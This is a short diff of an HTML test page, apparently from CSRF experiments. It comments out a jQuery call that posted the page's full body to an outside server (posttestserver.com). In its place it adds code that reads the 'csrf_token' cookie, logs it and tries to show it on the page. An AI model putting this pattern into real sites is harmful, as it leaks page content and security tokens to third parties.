@@ -3,14 +3,20 @@
   <head>
     <meta charset="utf-8">
     <script src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+	
 	<script>
 		$( document ).ready(function() {
            console.log( "ready!" );
-		   $.post( "https://posttestserver.com/post.php?dir=csrf3", { content: $('body').html()} );
+		   //$.post( "https://posttestserver.com/post.php?dir=csrf3", { content: $('body').html()} );
+		   var cookie =  $.cookie("csrf_token");
+		   console.log( cookie );
+		   $("#cookie").value = cookie;
 	    });
 	</script>
   </head>
   <body>
-     <div>test 3</div>
+     <div>test 4</div>
+	 <div id="cookie"></div>
   </body>
 </html>
